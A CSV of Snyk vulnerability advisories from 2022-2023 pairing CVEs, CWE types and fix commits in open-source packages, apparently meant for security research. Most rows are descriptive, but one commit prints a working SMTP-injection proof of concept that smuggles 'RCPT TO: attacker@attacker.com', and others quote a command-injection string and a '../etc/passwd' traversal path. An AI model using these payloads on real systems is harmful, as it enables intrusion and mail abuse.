CVE-2022-21129,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-NEMOAPPIUM-3183747,30/01/2023,27/12/2022,https://github.com/paypal/nemo-appium/commit/aa271d36dd5c81baae3c43aa2616c84f0ee4195f,Command Injection,https://api.github.com/repos/paypal/nemo-appium/commits/aa271d36dd5c81baae3c43aa2616c84f0ee4195f,Matt Edelman,medelman@paypal.com,nemo-appium,aa271d36dd5c81baae3c43aa2616c84f0ee4195f,prevent OS commands from being injected,JavaScript,7.4,high,"Affected versions of this package are vulnerable to Command Injection due to improper input sanitization in the 'module.exports.setup' function.
Note: In order to exploit this vulnerability appium-running 0.1.3  has to be installed as one of nemo-appium dependencies.",2023
CVE-2022-25881,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-HTTPCACHESEMANTICS-3248783,30/01/2023,26/01/2023,https://github.com/kornelski/http-cache-semantics/commit/560b2d8ef452bbba20ffed69dc155d63ac757b74,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/kornelski/http-cache-semantics/commits/560b2d8ef452bbba20ffed69dc155d63ac757b74,Kornel,kornel@geekhood.net,http-cache-semantics,560b2d8ef452bbba20ffed69dc155d63ac757b74,Don't use regex to trim whitespace,JavaScript,5.3,medium,"Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.",2023
CVE-2022-25916,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-MT7688WISCAN-3177394,31/01/2023,20/12/2022,https://github.com/simenkid/mt7688-wiscan/commit/ff6d6567c65b4e972916a8fbc4533212f20a2fa5,Command Injection,https://api.github.com/repos/simenkid/mt7688-wiscan/commits/ff6d6567c65b4e972916a8fbc4533212f20a2fa5,Simen Li,simen.hblinks@gmail.com,mt7688-wiscan,ff6d6567c65b4e972916a8fbc4533212f20a2fa5,v0.8.3 intf only accetps alphabets and numbers,Markdown,7.4,high,Affected versions of this package are vulnerable to Command Injection due to improper input sanitization in the 'wiscan.scan' function.,2023
CVE-2022-25979,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSUITES-3226764,30/01/2023,06/01/2023,https://github.com/jsuites/jsuites/commit/b31770d5fe91684a00177f629aab933139c32d9f,Cross-site Scripting (XSS),https://api.github.com/repos/jsuites/jsuites/commits/b31770d5fe91684a00177f629aab933139c32d9f,support,support@jspreadsheet.com,jsuites,b31770d5fe91684a00177f629aab933139c32d9f,jSuites 5 editor - security fixes.,JavaScript,5.4,medium,"jsuites is a jSuites is a collection of lightweight common required javascript plugins and web components. It is composed of fully responsive vanilla plugins to help you bring the best user experience to your projects, independent of the platform.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the Editor() function.",2023
CVE-2022-25936,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-SERVST-3244896,29/01/2023,23/01/2023,https://github.com/andrepolischuk/servst/commit/f7cae5d2d7c64c86bc512e1e50614240396ef114,Directory Traversal,https://api.github.com/repos/andrepolischuk/servst/commits/f7cae5d2d7c64c86bc512e1e50614240396ef114,Andrey Polischuk,me@andrepolischuk.com,servst,f7cae5d2d7c64c86bc512e1e50614240396ef114,"fix: fix limitation of a file path

https://cwe.mitre.org/data/definitions/22.html",JavaScript,7.5,high,Affected versions of this package are vulnerable to Directory Traversal due to improper sanitization of the filePath variable.,2023
CVE-2022-25967,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-ETA-2936803,29/01/2023,29/06/2022,https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd,Remote Code Execution (RCE),https://api.github.com/repos/eta-dev/eta/commits/5651392462ee0ff19d77c8481081a99e5b9138dd,Ben Gubler,nebrelbug@gmail.com,eta,5651392462ee0ff19d77c8481081a99e5b9138dd,Don't use data object for Eta configuration (#214),TypeScript,8.1,high,"eta is a Lightweight, fast, and powerful embedded JS template engine
Affected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with view options received from The Express render API.
Note: This is exploitable only for users who are rendering templates with user-defined data.",2023
CVE-2022-21192,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-SERVELITE-3149916,24/01/2023,28/11/2022,https://github.com/beenotung/serve-lite/commit/ba3efb7b28fa431513eaddcd16d795ebfb8a17d0,Directory Traversal,https://api.github.com/repos/beenotung/serve-lite/commits/ba3efb7b28fa431513eaddcd16d795ebfb8a17d0,Beeno Tung,aabbcc1241@yahoo.com.hk,serve-lite,ba3efb7b28fa431513eaddcd16d795ebfb8a17d0,"fix Directory Traversal vulnerability


reference: https://github.com/advisories/GHSA-5qq4-m6c3-xxmf",JavaScript,7.5,high,"serve-lite is an a lightweight http-server for static file-based web development
Affected versions of this package are vulnerable to Directory Traversal due to missing input sanitization or other checks and protections employed to the req.url passed as-is to path.join().",2023
CVE-2022-25847,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-SERVELITE-3149915,24/01/2023,28/11/2022,https://github.com/beenotung/serve-lite/commit/f7a00621b4cd4ebbade33184b65d6a2a2ea476d8,Cross-site Scripting (XSS),https://api.github.com/repos/beenotung/serve-lite/commits/f7a00621b4cd4ebbade33184b65d6a2a2ea476d8,Beeno Tung,aabbcc1241@yahoo.com.hk,serve-lite,f7a00621b4cd4ebbade33184b65d6a2a2ea476d8,"fix Cross-site scripting (XSS) vulnerability

reference: https://gist.github.com/lirantal/52debd25284726fcc2eaed9c7512975c",JavaScript,5.4,medium,"serve-lite is an a lightweight http-server for static file-based web development
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) because when it detects a request to a directory, it renders a file listing of all of its contents with links that include the actual file names without any sanitization or output encoding.",2023
CVE-2022-25927,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-3244450,24/01/2023,23/01/2023,https://github.com/faisalman/ua-parser-js/commit/a6140a17dd0300a35cfc9cff999545f267889411,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/faisalman/ua-parser-js/commits/a6140a17dd0300a35cfc9cff999545f267889411,Faisal Salman,f@faisalman.com,ua-parser-js,a6140a17dd0300a35cfc9cff999545f267889411,"Remove unsafe regex in trim() function

`trim()` function contains a regular expression that is vulnerable to ReDoS but was uncaught by `safe-regex` module.",JavaScript,5.3,medium,"ua-parser-js is a lightweight JavaScript-based user-agent string parser.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the trim() function.",2023
CVE-2022-25882,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-2395479,23/01/2023,07/02/2022,https://github.com/onnx/onnx/commit/f369b0e859024095d721f1d1612da5a8fa38988d,Directory Traversal,https://api.github.com/repos/onnx/onnx/commits/f369b0e859024095d721f1d1612da5a8fa38988d,Ivan Novikov,johnnovikov0@gmail.com,onnx,f369b0e859024095d721f1d1612da5a8fa38988d,"Do not allow to read tensor's external_data outside the model directory (#4400)

* Not allow to read tensor external_data outside the model directory

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Fix formatting errors

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Disable segfaulty test

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Fix cpp tests

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Fix UB while removing ../

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Fix clang-format

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Check for symlinks only on POSIX systems

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Add specific to Windows external_data test

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Change specific Windows external_data test decorator tofix mypy

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

* Remove unused pathlib

Signed-off-by: jnovikov <johnnovikov0@gmail.com>

Signed-off-by: jnovikov <johnnovikov0@gmail.com>",C/C++,7.5,high,"onnx is an Open Neural Network Exchange
Affected versions of this package are vulnerable to Directory Traversal as the external_data field of the tensor proto can have a path to the file which is outside the model current directory or user-provided directory, for example ""../../../etc/passwd""",2023
CVE-2022-25860,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3177391,23/01/2023,20/12/2022,https://github.com/steveukx/git-js/commit/ec97a39ab60b89e870c5170121cd9c1603cc1951,Remote Code Execution (RCE),https://api.github.com/repos/steveukx/git-js/commits/ec97a39ab60b89e870c5170121cd9c1603cc1951,Steve King,steve@mydev.co,git-js,ec97a39ab60b89e870c5170121cd9c1603cc1951,"Block unsafe pack (push --exec) (#882)

Add `git push --exec` to the set of blocked operations without the use of an `allowUnsafePack` override.",Markdown,8.1,high,"simple-git is a light weight interface for running git commands in any node.js application.
Affected versions of this package are vulnerable to Remote Code Execution (RCE) via the clone(), pull(), push() and listRemote() methods, due to improper input sanitization.
This vulnerability exists due to an incomplete fix of CVE-2022-25912.",2023
CVE-2022-21191,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-GLOBALMODULESPATH-3167973,12/01/2023,13/12/2022,https://github.com/rosen-vladimirov/global-modules-path/commit/edbdaff077ea0cf295b1469923c06bbccad3c180,Command Injection,https://api.github.com/repos/rosen-vladimirov/global-modules-path/commits/edbdaff077ea0cf295b1469923c06bbccad3c180,rosen-vladimirov,rosen.vladimirov@progress.com,global-modules-path,edbdaff077ea0cf295b1469923c06bbccad3c180,"fix: do not allow command injection

Due to usage of execSync, callers may inject commands, like getPath(""something & touch abc"", ""somethingElse & touch def"").
To fix this, replace execSync with spawnSync, which is safe for command injection.",JavaScript,7.4,high,Affected versions of this package are vulnerable to Command Injection due to missing input sanitization or other checks and sandboxes being employed to the getPath  function.,2023
CVE-2022-25926,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-WINDOWCONTROL-3186345,04/01/2023,02/01/2023,https://github.com/bruno-robert/window-control/commit/075c854534a749d887655a906759f5a7eee95173,Command Injection,https://api.github.com/repos/bruno-robert/window-control/commits/075c854534a749d887655a906759f5a7eee95173,Bruno Robert,bruno.jeanluke@icloud.com,window-control,075c854534a749d887655a906759f5a7eee95173,fix: add sanitisation to user input,JavaScript,7.4,high,"window-control is a package aimed to do similar tasks as robot.js (without mouse control) but without the compiling of external C++ code.
Affected versions of this package are vulnerable to Command Injection via the sendKeys function, due to improper input sanitization.",2023
CVE-2022-24913,CWE-377,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMFASTERXMLUTIL-3227926,11/01/2023,11/01/2023,https://github.com/cowtowncoder/java-merge-sort/commit/450fdee70b5f181c2afc5d817f293efa1a543902,Insecure Temporary File,https://api.github.com/repos/cowtowncoder/java-merge-sort/commits/450fdee70b5f181c2afc5d817f293efa1a543902,Jonathan Leitschuh,Jonathan.Leitschuh@gmail.com,java-merge-sort,450fdee70b5f181c2afc5d817f293efa1a543902,"vuln-fix: Temporary File Information Disclosure



This fixes temporary file information disclosure vulnerability due to the use
of the vulnerable `File.createTempFile()` method. The vulnerability is fixed by
using the `Files.createTempFile()` method which sets the correct posix permissions.

Weakness: CWE-377: Insecure Temporary File
Severity: Medium
CVSSS: 5.5
Detection: CodeQL & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.SecureTempFileCreation)

Reported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>
Signed-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>

Bug-tracker: https://github.com/JLLeitschuh/security-research/issues/18


Co-authored-by: Moderne <team@moderne.io>",Java,5.5,medium,"com.fasterxml.util:java-merge-sort is a package for basic configurable disk-backed N-way merge sort
Affected versions of this package are vulnerable to Insecure Temporary File.
in the StdTempFileProvider() function in StdTempFileProvider.java, which uses the permissive File.createTempFile() function, exposing temporary file contents.",2023
CVE-2022-25948,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-LIQUIDJS-2952868,21/12/2022,18/07/2022,https://github.com/harttle/liquidjs/commit/7e99efc5131e20cf3f59e1fc2c371a15aa4109db,Information Exposure,https://api.github.com/repos/harttle/liquidjs/commits/7e99efc5131e20cf3f59e1fc2c371a15aa4109db,Harttle,harttle@harttle.com,liquidjs,7e99efc5131e20cf3f59e1fc2c371a15aa4109db,"feat: `ownPropertyOnly` option to protect prototype, #454",Markdown,5.3,medium,"liquidjs is an A simple, expressive, safe and Shopify compatible template engine in pure JavaScript.
Affected versions of this package are vulnerable to Information Exposure when ownPropertyOnly parameter is set to False, which results in leaking properties of a prototype.",2022
CVE-2022-25929,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-SMOOTHIE-3177364,20/12/2022,20/12/2022,https://github.com/joewalnes/smoothie/commit/8e0920d50da82f4b6e605d56f41b69fbb9606a98,Cross-site Scripting (XSS),https://api.github.com/repos/joewalnes/smoothie/commits/8e0920d50da82f4b6e605d56f41b69fbb9606a98,WofWca,wofwca@protonmail.com,smoothie,8e0920d50da82f4b6e605d56f41b69fbb9606a98,"fix: potential XSS when `tooltipLabel` or `strokeStyle` are controlled by users

This doesn't completely get rid of `innerHTML` usage, but at least
now the developer is responsible for `tooltipFormatter` not returning
dangerous HTML if they decide to override it.",JavaScript,5.4,medium,"smoothie is a Smoothie Charts: smooooooth JavaScript charts for realtime streaming data
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user input sanitization in strokeStyle and tooltipLabel properties. Exploiting this vulnerability is possible when the user can control these properties.",2022
CVE-2022-22984,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680,30/11/2022,29/09/2022,https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a,Command Injection,https://api.github.com/repos/snyk/cli/commits/80d97a93326406e09776156daf72e3caa03ae25a,gitphill,phill.garrett@snyk.io,cli,80d97a93326406e09776156daf72e3caa03ae25a,fix: escape child process arguments,Config files,5.0,medium,"Affected versions of this package are vulnerable to Command Injection due to an incomplete fix for CVE-2022-40764.
A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.
In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.
This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.
The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",2022
CVE-2022-21126,CWE-379,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMGITHUBSAMTOOLS-3149901,28/11/2022,28/11/2022,https://github.com/samtools/htsjdk/commit/4a4024a97ee3e87096df6ad9b22c8260bd527772,Creation of Temporary File in Directory with Insecure Permissions,https://api.github.com/repos/samtools/htsjdk/commits/4a4024a97ee3e87096df6ad9b22c8260bd527772,Louis Bergelson,louisb@broadinstitute.org,htsjdk,4a4024a97ee3e87096df6ad9b22c8260bd527772,"Fix temporary directory hijacking or temporary directory information disclosure (#1621)

This replaces and closes #1617.

Fix a vulnerability which allows a malicious user access files created in a temp directory if it was created using IOUtils.createTempDir.  
The implementation has been changed to use the more secure Files.createTemporaryDirectory(). This has a side effect of making the second ""suffix"" argument no longer usable and it is now simply appended to the existing prefix.  
Deprecating IOUtils.createTempDir(String, String) and adding a new single argument version instead which returns a Path.

This potentially exposed data created by CoordinateSortedPairInfoMaps on shared systems to a malicious users with access to the global temp directory.  

It is recommended that user upgrade if they use CoordinateSortedPairInfoMap or IOUTils.createTempDir() in their code.

* vuln-fix: Temporary Directory Hijacking or Information Disclosure

This fixes either Temporary Directory Hijacking, or Temporary Directory Local Information Disclosure.

Weakness: CWE-379: Creation of Temporary File in Directory with Insecure Permissions
Severity: High
CVSSS: 7.3
Detection: CodeQL & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.UseFilesCreateTempDirectory)

Reported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>
Signed-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>

Bug-tracker: https://github.com/JLLeitschuh/security-research/issues/10

Co-authored-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>
Co-authored-by: Moderne <team@moderne.io>",Java,7.3,high,"com.github.samtools:htsjdk is a Java API for high-throughput sequencing data (HTS) formats
Affected versions of this package are vulnerable to Creation of Temporary File in Directory with Insecure Permissions.
due to the createTempDir() function in util/IOUtil.java not checking for the existence of the temporary directory before attempting to create it.",2022
CVE-2022-24441,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYK-3111871,30/11/2022,29/09/2022,https://github.com/snyk/snyk-eclipse-plugin/commit/b5a8bce25a359ced75f83a729fc6b2393fc9a495,Code Injection,https://api.github.com/repos/snyk/snyk-eclipse-plugin/commits/b5a8bce25a359ced75f83a729fc6b2393fc9a495,Michel Kaporin,michelkaporin@users.noreply.github.com,snyk-eclipse-plugin,b5a8bce25a359ced75f83a729fc6b2393fc9a495,"Merge pull request #106 from snyk/feat/trust-feature

feat: add folder trust",Markdown,5.8,medium,"snyk is a advanced tool that scans and monitors projects for security vulnerabilities.
Affected versions of this package are vulnerable to Code Injection.
when analyzing a project. An attacker who can convince a user to scan a malicious project can include 
commands in a build file such as build.gradle or gradle-wrapper.jar, which will be executed with the privileges of the application.
This vulnerability may be triggered when running the the CLI tool directly, or when running a scan with one of the IDE plugins that invoke the Snyk CLI.
Successful exploitation of this issue would likely require some level of social engineering - to coerce an untrusted project to be downloaded and analyzed via the Snyk CLI or opened in an IDE where a Snyk IDE plugin is installed and enabled. Additionally, if the IDE has a Trust feature then the target folder must be marked as ‘trusted’ in order to be vulnerable.
NOTE: This issue is independent of the one reported in CVE-2022-40764, and upgrading to a fixed version for this addresses that issue as well.
The affected IDE plugins and versions are:

VS Code - Affected: <=1.8.0, Fixed: 1.9.0
IntelliJ - Affected: <=2.4.47, Fixed: 2.4.48
Visual Studio - Affected: <=1.1.30, Fixed: 1.1.31
Eclipse - Affected: <=v20221115, Fixed: v20221130
Language Server - Affected: <=v20221109, Fixed: v20221130",2022
CVE-2022-25892,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320,31/10/2022,24/10/2022,https://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002,Denial of Service (DoS),https://api.github.com/repos/julianhille/MuhammaraJS/commits/1890fb555eaf171db79b73fdc3ea543bbd63c002,Julian Hille,julianhille@users.noreply.github.com,MuhammaraJS,1890fb555eaf171db79b73fdc3ea543bbd63c002,"Fix NPE in pdf parser

Fixes #214",Markdown,7.5,high,"muhammara is a Create, read and modify PDF files and streams. A drop in replacement for hummusjs PDF library
Affected versions of this package are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be parsed.",2022
CVE-2022-25892,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138,31/10/2022,24/10/2022,https://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002,Denial of Service (DoS),https://api.github.com/repos/julianhille/MuhammaraJS/commits/1890fb555eaf171db79b73fdc3ea543bbd63c002,Julian Hille,julianhille@users.noreply.github.com,MuhammaraJS,1890fb555eaf171db79b73fdc3ea543bbd63c002,"Fix NPE in pdf parser

Fixes #214",Markdown,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be parsed.,2022
CVE-2022-25885,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091139,31/10/2022,31/10/2022,https://github.com/julianhille/MuhammaraJS/commit/0a6427eec82ef2978995e453de2dc0d6224dd46c,Denial of Service (DoS),https://api.github.com/repos/julianhille/MuhammaraJS/commits/0a6427eec82ef2978995e453de2dc0d6224dd46c,Julian Hille,j.hille484@googlemail.com,MuhammaraJS,0a6427eec82ef2978995e453de2dc0d6224dd46c,"Fix createWriter cpp / crash / npe when using null as stream object (#190)

Fix createWriter cpp / crash / npe when using null as stream object

Fixes #188",Markdown,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) when PDFStreamForResponse() is used with invalid data.,2022
CVE-2022-25885,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3091137,31/10/2022,31/10/2022,https://github.com/julianhille/MuhammaraJS/commit/0a6427eec82ef2978995e453de2dc0d6224dd46c,Denial of Service (DoS),https://api.github.com/repos/julianhille/MuhammaraJS/commits/0a6427eec82ef2978995e453de2dc0d6224dd46c,Julian Hille,j.hille484@googlemail.com,MuhammaraJS,0a6427eec82ef2978995e453de2dc0d6224dd46c,"Fix createWriter cpp / crash / npe when using null as stream object (#190)

Fix createWriter cpp / crash / npe when using null as stream object

Fixes #188",Markdown,7.5,high,"muhammara is a Create, read and modify PDF files and streams. A drop in replacement for hummusjs PDF library
Affected versions of this package are vulnerable to Denial of Service (DoS) when PDFStreamForResponse() is used with invalid data.",2022
CVE-2022-25918,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-SHESCAPE-3061108,26/10/2022,25/10/2022,https://github.com/ericcornelissen/shescape/commit/552e8eab56861720b1d4e5474fb65741643358f9,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/ericcornelissen/shescape/commits/552e8eab56861720b1d4e5474fb65741643358f9,Eric Cornelissen,ericornelissen@gmail.com,shescape,552e8eab56861720b1d4e5474fb65741643358f9,"Merge pull request from GHSA-cr84-xvw4-qx3c

* Test polynomial backtracking ReDoS attack string on Bash

Create a unit test for a (new) ReDoS string on bash. This test should be
failing in this commit.

* Fix ReDoS (as seen in ReDoS test 1) for bash

Update bash escaping to pessimistically escape opening curly braces,
similar to Zsh escaping, to fix the ReDoS due to the complex regular
expression for opening curly braces.

Update tests accordingly.

* Test against old ReDoS values and all shells

Refactor the ReDoS test such that 1) it's tested against all (supported)
shells, and 2) extensible to test against multiple potential ReDoS
strings. Regarding the latter, the scope has been updated to include
known ReDoS strings related to CVE-2022-36064.

The `redos` value is intentionally a function as this avoids building
the string unnecessarily if the file is imported but the `redos` value
isn't used.

* Update SECURITY.md

Add latest advisory and credit its finder",Markdown,5.3,medium,"shescape is a simple shell escape library
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the escape function in index.js, due to the usage of insecure regex in the escapeArgBash function.",2022
,CWE-147,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-AIOSMTPLIB-3042406,11/10/2022,02/09/2022,https://github.com/cole/aiosmtplib/commit/b459c048c333816a2eafcf3c7031d923a1733283,SMTP Injection,https://api.github.com/repos/cole/aiosmtplib/commits/b459c048c333816a2eafcf3c7031d923a1733283,Cole Maclean,hi@colemaclean.dev,aiosmtplib,b459c048c333816a2eafcf3c7031d923a1733283,"Fix possible command injection vulnerability

References:
https://www.mbsd.jp/research/20151218/smtp-injection/
https://consensys.net/diligence/vulnerabilities/python-smtplib-multiple-crlf-injection/

PoC:

```
import asyncio
from email.message import EmailMessage

from aiosmtplib import SMTP

async def say_hello():
    message = EmailMessage()
    message[""From""] = ""root@localhost""
    message[""To""] = ""somebody@example.com""
    message.set_content(""Sent via aiosmtplib"")

    smtp_client = SMTP(
        hostname=""127.0.0.1"",
        port=1225,
        source_address=""bob.example.org\r\nRCPT TO: <attacker@attacker.com>""
    )
    async with smtp_client:
        await smtp_client.send_message(message)

event_loop = asyncio.get_event_loop()
event_loop.run_until_complete(say_hello())
```",Unknown,5.9,medium,"aiosmtplib is an aiosmtplib is an asynchronous SMTP client for use with asyncio.
Affected versions of this package are vulnerable to SMTP Injection. It is possible to insert an arbitrary SMTP command through the hostname or the source_address field.",2022
CVE-2022-24439,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858,05/12/2022,13/11/2022,https://github.com/gitpython-developers/GitPython/commit/2625ed9fc074091c531c27ffcba7902771130261,Remote Code Execution (RCE),https://api.github.com/repos/gitpython-developers/GitPython/commits/2625ed9fc074091c531c27ffcba7902771130261,Steve Kowalik,steven@wedontsleep.org,GitPython,2625ed9fc074091c531c27ffcba7902771130261,"Forbid unsafe protocol URLs in Repo.clone{,_from}()

Since the URL is passed directly to git clone, and the remote-ext helper
will happily execute shell commands, so by default disallow URLs that
contain a ""::"" unless a new unsafe_protocols kwarg is passed.
(CVE-2022-24439)

Fixes #1515",Python,8.1,high,"GitPython is a python library used to interact with Git repositories
Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments. This is only relevant when enabling the ext transport protocol.",2022
CVE-2022-22984,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677,30/11/2022,29/09/2022,https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a,Command Injection,https://api.github.com/repos/snyk/cli/commits/80d97a93326406e09776156daf72e3caa03ae25a,gitphill,phill.garrett@snyk.io,cli,80d97a93326406e09776156daf72e3caa03ae25a,fix: escape child process arguments,Config files,5.0,medium,"Affected versions of this package are vulnerable to Command Injection due to an incomplete fix for CVE-2022-40764.
A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.
In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.
This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.
The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",2022
CVE-2022-22984,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623,30/11/2022,29/09/2022,https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a,Command Injection,https://api.github.com/repos/snyk/cli/commits/80d97a93326406e09776156daf72e3caa03ae25a,gitphill,phill.garrett@snyk.io,cli,80d97a93326406e09776156daf72e3caa03ae25a,fix: escape child process arguments,Config files,5.0,medium,"snyk-mvn-plugin is a plugin for the Snyk CLI tool, providing dependency metadata for Maven projects that use mvn and have a pom.xml file.
Affected versions of this package are vulnerable to Command Injection due to an incomplete fix for CVE-2022-40764.
A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.
In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.
This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.
The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",2022
CVE-2022-25912,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221,05/12/2022,10/11/2022,https://github.com/steveukx/git-js/commit/774648049eb3e628379e292ea172dccaba610504,Remote Code Execution (RCE),https://api.github.com/repos/steveukx/git-js/commits/774648049eb3e628379e292ea172dccaba610504,Steve King,steve@mydev.co,git-js,774648049eb3e628379e292ea172dccaba610504,"Chore: bump lerna, jest and create prettier workflow (#862)

* Chore: bump lerna to latest `6.0.3`
* Chore: prettier and add lint action",Markdown,8.1,high,"simple-git is a light weight interface for running git commands in any node.js application.
Affected versions of this package are vulnerable to Remote Code Execution (RCE) when enabling the ext transport protocol, which makes it exploitable via clone() method.
This vulnerability exists due to an incomplete fix of CVE-2022-24066.",2022
CVE-2022-4231,CWE-384,Snyk,https://security.snyk.io/vuln/SNYK-PHP-TRIBALSYSTEMSZENARIO-3125786,30/11/2022,18/11/2022,https://github.com/TribalSystems/Zenario/commit/1d4decd70a845046630b28ed5c70e66d85b11128,Session Fixation,https://api.github.com/repos/TribalSystems/Zenario/commits/1d4decd70a845046630b28ed5c70e66d85b11128,Chris Turnbull,,Zenario,1d4decd70a845046630b28ed5c70e66d85b11128,"Updating the GitHub repo with the latest bugfixes from the 9.3 branch

Added some session fixation protection to admin/user logins
-----------------------------------------------------------

Whenever someone logs into Zenario, either as an extranet user or as an admin, we are now
regenerating their session ID.

This has no effect or downside to the user, and helps protect against a session fixation
attack if an attacker is using some other exploit to trigger one.

Other fixes
-----------

PHP 8 has now started issuing a fatal error if you attempt to upload a GIFs image with the
background layer set to an invalid colour. This has caused a lot of confusion, so we've
written a work-around to automatically fix the issue.

Fixed a bug with grid layouts in nests, where if you created a layout without a grouping,
the grid layout inside a nest plugin would fail to work.",Config files,6.3,medium,"tribalsystems/zenario is a Zenario is a web-based content management system for sites with one or many languages.
Affected versions of this package are vulnerable to Session Fixation such that the user session identifier (authentication token) is issued to the browser prior to authentication but is not changed after user logout and re-login into the application when Remember me option is active. Failing to issue a new session ID following a successful login introduces the possibility for an attacker to set up a trap session on the device the victim is likely to login with.",2022
